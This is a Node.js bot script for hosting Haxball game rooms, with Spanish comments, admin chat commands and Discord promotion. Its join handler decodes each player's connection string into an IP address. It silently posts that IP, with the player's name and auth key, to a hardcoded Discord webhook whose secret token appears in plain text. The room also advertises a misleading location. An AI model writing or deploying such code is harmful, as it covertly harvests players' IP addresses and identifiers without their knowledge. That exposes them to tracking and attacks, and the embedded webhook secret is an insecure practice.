const API = require("./src/index")();
const { Room } = API;
const EnglishLanguage = require("./languages/englishLanguage");
API.Language.current = new EnglishLanguage(API);

const axios = require("axios");

/* ------------------ Funciones auxiliares ------------------ */

function decryptHex(str) {
  if (!str || typeof str !== "string") return "";
  let out = "";
  for (let i = 0; i < str.length; i += 2) {
    out += String.fromCharCode(parseInt(str.substring(i, i + 2), 16));
  }
  return out;
}

async function sendDiscordRaw(webhookUrl, body) {
  if (!webhookUrl) return;
  try {
    await axios.post(webhookUrl, body, { timeout: 10000 });
    return true;
  } catch (err) {
    console.error("❌ Error enviando webhook:", err?.message || err);
    return false;
  }
}

async function sendDiscordPlayer(webhookUrl, player, roomName) {
  if (!webhookUrl) return;
  const payload = {
    content: `Nuevo jugador conectado: **${player.name}** en ${roomName}`,
    embeds: [
      {
        title: "🎯 Nuevo Jugador Conectado",
        color: 0x00ff00,
        fields: [
          { name: "Nombre", value: player.name || "N/A", inline: true },
          { name: "ID", value: String(player.id || "N/A"), inline: true },
          { name: "Auth", value: player.auth || "N/A", inline: true },
          { name: "Conn", value: player.conn || "No tiene", inline: true },
          { name: "IP", value: decryptHex(player.conn) || "No tiene", inline: true }
        ],
        timestamp: new Date().toISOString(),
        footer: { text: "Teleese x Yeah" }
      }
    ]
  };
  await sendDiscordRaw(webhookUrl, payload);
}

async function sendDiscordRoomLink(webhookUrl, roomLink, roomName) {
  if (!webhookUrl) return;
  const payload = {
    content: `🏟 Sala creada: **${roomName}**\n${roomLink}`,
    embeds: [
      {
        title: "Sala creada",
        color: 0x0000ff,
        fields: [{ name: "Link", value: roomLink, inline: false }],
        timestamp: new Date().toISOString(),
        footer: { text: "Teleese x Crash" }
      }
    ]
  };
  await sendDiscordRaw(webhookUrl, payload);
}

/* ------------------ Configuración ------------------ */

const roomNames = Array(11).fill("🟣 Yeah | SALAS USA | !discord 🟣");
const maxPlayersList = Array(11).fill(30);
const fakePlayersList = Array(11).fill(24);

const geoList = Array(11).fill({
  name: "🟣 Yeah | SALAS USA | !discord 🟣",
  flag: "eu",
  lat: -34.68330001831055,
  lon: -58.88669967651367,
  password: 0,
  maxPlayers: 30,
});

/* ------------------ Selección por índice ------------------ */

const jobIndex = Number.parseInt(process.env.INDEX || "0", 10);
const jobId = process.env.JOB_ID; // identificador de la sala (interno)
const recaptchaToken = process.env.RECAPTCHA_TOKEN; // token real de Haxball
const webhookUrl = "https://discord.com/api/webhooks/1365562720862208091/pgiPEDfXCpYE7mZM4-o1mDJ-AZnRTFxT_J_-EdO71hNUxFBFQ8Y5KcU6_jyGXXh3kvH2";

const roomName = roomNames[jobIndex % roomNames.length];
const maxPlayers = maxPlayersList[jobIndex % maxPlayersList.length];
const fakePlayers = fakePlayersList[jobIndex % fakePlayersList.length];
const geo = geoList[jobIndex % geoList.length];

if (!recaptchaToken) {
  console.error("❌ No se encontró RECAPTCHA_TOKEN. No se puede crear la sala.");
  process.exit(1);
}

console.log(`🚀 Creando sala: ${roomName} | MaxPlayers: ${maxPlayers} | FakePlayers: ${fakePlayers} | Geo: ${JSON.stringify(geo)}`);

/* ------------------ Crear sala ------------------ */

Room.create(
  {
    name: roomName,
    password: process.env.ROOM_PASSWORD || "",
    maxPlayerCount: maxPlayers,
    unlimitedPlayerCount: true,
    showInRoomList: true,
    geo: geo,
    token: recaptchaToken // 👈 token de recaptcha válido
  },
  {
    storage: {
      player_name: process.env.PLAYER_NAME || "Teleese",
      avatar: process.env.PLAYER_AVATAR || ":)"
    },
    libraries: [],
    config: null,
    renderer: null,
    plugins: [],
    onOpen: (room) => {
      console.log("✅ Sala creada (onOpen). Esperando link...");

      room.onAfterRoomLink = (roomLink) => {
        console.log("🔗 Link de la sala:", roomLink);
        if (webhookUrl) sendDiscordRoomLink(webhookUrl, roomLink, roomName);
      };

      /* ------------------ Eventos de Jugadores ------------------ */

      room.onPlayerJoin = (playerObj) => {
        try {
          const players = room.getPlayerList();
          const total = players.length;

          console.log(`🎯 Nuevo jugador: ${playerObj.name} (ID: ${playerObj.id})`);
          sendDiscordPlayer(webhookUrl, playerObj, roomName);

          // Mensaje de bienvenida
          room.sendAnnouncement(`Bienvenidx ${playerObj.name}! 🟣 Unite a nuestro Discord: https://discord.gg/6bvvAQZF`, playerObj.id, 0xff00ff, "bold", 2);

          // Si es el primero → darle admin
          if (total === 1) {
            room.setPlayerAdmin(playerObj.id, true);
            room.sendAnnouncement(`🔑 ${playerObj.name} es el primer jugador. Admin asignado automáticamente.`, null, 0x00ff00, "bold", 2);
          }
        } catch (e) {
          console.error("Error en onPlayerJoin:", e);
        }
      };

      room.onPlayerLeave = (playerObj) => {
        console.log(`👋 Jugador salió: ${playerObj.name} (ID: ${playerObj.id})`);
      };

      /* ------------------ Comandos del Admin y Generales ------------------ */

      room.onPlayerChat = (player, message) => {
        const msg = message.trim().toLowerCase();
        const p = room.getPlayer(player.id);

        // Comando público !discord
        if (msg === "!discord") {
          room.sendAnnouncement(`🟣 Unite a nuestro Discord: https://discord.gg/6bvvAQZF`, null, 0x7289da, "bold", 2);
          return false;
        }

        // Comandos de admin (solo admins)
        if (p.admin) {
          if (msg.startsWith("!lock")) {
            const pass = msg.split(" ")[1] || "reservada";
            room.setPassword(pass);
            room.sendAnnouncement(`🔒 Sala bloqueada con contraseña: ${pass}`, null, 0xff9900, "bold", 2);
            return false;
          }

          if (msg === "!unlock") {
            room.setPassword("");
            room.sendAnnouncement(`🔓 Sala abierta al público.`, null, 0x00ff00, "bold", 2);
            return false;
          }

          if (msg.startsWith("!admin ")) {
            const targetName = msg.slice(7).trim();
            const found = room.getPlayerList().find(pl => pl.name.toLowerCase() === targetName.toLowerCase());
            if (found) {
              room.setPlayerAdmin(found.id, true);
              room.sendAnnouncement(`👑 ${found.name} ahora es admin.`, null, 0x00ff00, "bold", 2);
            } else {
              room.sendAnnouncement(`⚠️ No se encontró jugador con ese nombre.`, player.id, 0xff0000, "bold", 2);
            }
            return false;
          }

          if (msg.startsWith("!kick ")) {
            const targetName = msg.slice(6).trim();
            const found = room.getPlayerList().find(pl => pl.name.toLowerCase() === targetName.toLowerCase());
            if (found) {
              room.kickPlayer(found.id, "Expulsado por admin", false);
              room.sendAnnouncement(`🚪 ${found.name} fue expulsado.`, null, 0xff5555, "bold", 2);
            }
            return false;
          }
        }

        return false; // mostrar el chat normalmente
      };

      room.onRoomError = (err) => console.error("❌ Error en sala:", err);
    },
    onClose: (msg) => {
      console.log("🔴 Bot ha salido de la sala:", msg?.toString());
      process.exit(0);
    }
  }
);
